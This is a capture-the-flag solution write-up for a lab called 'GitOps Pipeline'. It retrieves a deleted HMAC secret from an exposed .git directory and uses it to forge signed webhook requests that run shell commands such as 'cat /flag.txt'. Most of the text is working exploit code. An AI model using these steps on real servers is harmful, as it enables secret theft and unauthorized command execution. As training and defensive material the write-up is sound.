# Solution: GitOps Pipeline (web-gitops-pipeline)

## Vulnerability Chain
1. **Exposed .git directory** — `/.git/` is served by the Flask gitserver
2. **Deleted secret in git history** — `.env` with WEBHOOK_SECRET was committed then deleted
3. **HMAC bypass** — use recovered secret to sign webhook payloads
4. **Command execution** via authenticated webhook

## Step-by-Step Exploit

### Step 1: Discover the exposed .git directory

```bash
TARGET="http://<TARGET_IP>:8080"

# Verify .git exposure
curl $TARGET/.git/HEAD
# Response: ref: refs/heads/main

curl $TARGET/.git/config
# Shows repository configuration

curl $TARGET/.git/logs/HEAD
# Shows commit log with full hashes!
```

### Step 2: Extract the deleted secret from git history

```bash
# Get all commit hashes from the log
curl $TARGET/.git/logs/HEAD
# Output format: <old-hash> <new-hash> CI System <timestamp> <message>
# Example:
# 0000...000 abc123def Initial commit: add pipeline config
# abc123def  fed987cba Remove secrets from repo, use vault instead

# The FIRST commit (abc123...) contained the .env file with the secret
FIRST_COMMIT="abc123def..."  # replace with actual hash from logs

# Get the tree object of the first commit
curl $TARGET/.git/objects/${FIRST_COMMIT:0:2}/${FIRST_COMMIT:2}
# Binary zlib-compressed data

# Option A: Clone the whole repo using git-dumper tool
pip install git-dumper
git-dumper $TARGET/.git /tmp/repo-dump
cd /tmp/repo-dump
git log --all --oneline
git show HEAD~1:.env
# Output: WEBHOOK_SECRET=sup3rs3cr3t_hmac_k3y
```

#### Manual extraction without tools:

```python
import urllib.request, zlib, hashlib

TARGET = "http://<TARGET_IP>:8080"

# 1. Get commit log
log = urllib.request.urlopen(f"{TARGET}/.git/logs/HEAD").read().decode()
# Parse first commit hash
first_hash = log.strip().split("\n")[0].split(" ")[1]

# 2. Fetch the commit object
path = f"/.git/objects/{first_hash[:2]}/{first_hash[2:]}"
data = urllib.request.urlopen(f"{TARGET}{path}").read()
commit_obj = zlib.decompress(data).decode()
# commit_obj contains: "commit ...\ntree <tree_hash>\n..."
tree_hash = commit_obj.split("tree ")[1].split("\n")[0]

# 3. Fetch the tree object
path2 = f"/.git/objects/{tree_hash[:2]}/{tree_hash[2:]}"
data2 = urllib.request.urlopen(f"{TARGET}{path2}").read()
tree_raw = zlib.decompress(data2)
# Tree object: binary format with mode, name, sha1 for each entry
# Parse manually or use gitpython

# 4. Find .env blob hash in tree (binary parsing)
# ... or just use git-dumper which handles all this
```

### Step 3: Forge HMAC-signed webhook payload

```python
import hmac
import hashlib
import json
import urllib.request

SECRET = "sup3rs3cr3t_hmac_k3y"
TARGET = "http://<TARGET_IP>:8080"

# Payload: trigger pipeline with command execution
payload = json.dumps({
    "ref": "refs/heads/main",
    "steps": [
        "cat /flag.txt"          # webhook-runner has flag at /flag.txt
    ]
}).encode()

sig = "sha256=" + hmac.new(SECRET.encode(), payload, hashlib.sha256).hexdigest()

req = urllib.request.Request(
    f"{TARGET}/internal/webhook",
    data=payload,
    headers={
        "Content-Type": "application/json",
        "X-Hub-Signature-256": sig
    },
    method="POST"
)

resp = urllib.request.urlopen(req)
result = json.loads(resp.read())
print(result)
# {"status": "executed", "outputs": [{"step": "cat /flag.txt", "stdout": "HL4{...}"}]}
```

### Step 4: Extract the flag

The `/internal/webhook` endpoint returns stdout from executed steps.
The flag is at `/flag.txt` on the webhook-runner container.

```bash
# Full exploit script
python3 << 'EOF'
import hmac, hashlib, json, urllib.request

SECRET = "sup3rs3cr3t_hmac_k3y"
URL = "http://<TARGET_IP>:8080/internal/webhook"

payload = json.dumps({
    "ref": "refs/heads/main",
    "steps": ["cat /flag.txt", "id", "hostname"]
}).encode()

sig = "sha256=" + hmac.new(SECRET.encode(), payload, hashlib.sha256).hexdigest()
req = urllib.request.Request(URL, data=payload,
    headers={"Content-Type": "application/json", "X-Hub-Signature-256": sig},
    method="POST")

result = json.loads(urllib.request.urlopen(req).read())
for output in result["outputs"]:
    print(f"$ {output['step']}")
    print(output.get("stdout", output.get("error", "")))
EOF
```

## Key Takeaways
- Never expose .git directories in production (use .gitignore, server rules)
- Git history is permanent — even "deleted" files exist in blob objects
- HMAC secrets in deleted commits are still accessible via git history reconstruction
- The `/.git/logs/HEAD` file directly reveals all commit hashes
